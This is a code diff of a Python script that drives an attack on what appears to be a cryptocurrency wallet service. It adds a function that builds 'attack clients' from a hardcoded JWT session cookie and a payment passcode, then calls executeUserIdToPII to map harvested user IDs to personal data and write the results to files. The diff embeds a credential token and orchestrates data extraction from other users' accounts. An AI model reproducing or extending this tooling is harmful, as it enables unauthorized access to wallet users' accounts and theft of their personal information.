@@ -1,5 +1,5 @@
 import asyncio
-from script import executeAttack
+from script import executeAttack, executeUserIdToPII
 from attack import CWalletClient
 from coin import COINS
 import logging
@@ -37,8 +37,7 @@ def setup_logging(enabled: bool = True):
     logging.getLogger("asyncio").setLevel(logging.WARNING)
 
 
-
-async def main():
+async def userIdExtraction():
     # Cookies
     clients = []
     cookies = [
@@ -67,6 +66,31 @@ async def main():
         amount=amount
     )
 
+async def userDataExtraction():
+    # Cookies
+    clients = []
+    cookies = [
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzM3MjgzOHRkcm5xdGpwZjRwa3hwcWg5NjhqM2E3aCIsInNlc3Npb25faWQiOiI0MDk2aWNmNWF1N29yaW56ZmZ4YXU1Y3k1b3pwMW8iLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUwOTE4NjEsImlhdCI6MTc3MjAxOTg2MX0.DOPdygehYqSnR11JtFwBnnkuURdmVS4RooTzoeW9YLs", # 10
+    ]
+    # Creating attack clients
+    for cookie in cookies:
+        clients.append(CWalletClient(authCookie=cookie, payPassCode="111111"))
+
+    # Getting Addresses
+    userIdsFileName = "results_eth.txt"
+    resultsFileName = "results_eth_two.txt"
+
+    await executeUserIdToPII(
+        userIdsFileName=userIdsFileName,
+        resultsFileName=resultsFileName,
+        clients=clients,
+    )
+
+
+async def main():
+    # await userIdExtraction()
+    await userDataExtraction()
+
 if __name__ == "__main__":
-    setup_logging(enabled=False)
+    setup_logging(enabled=True)
     asyncio.run(main())
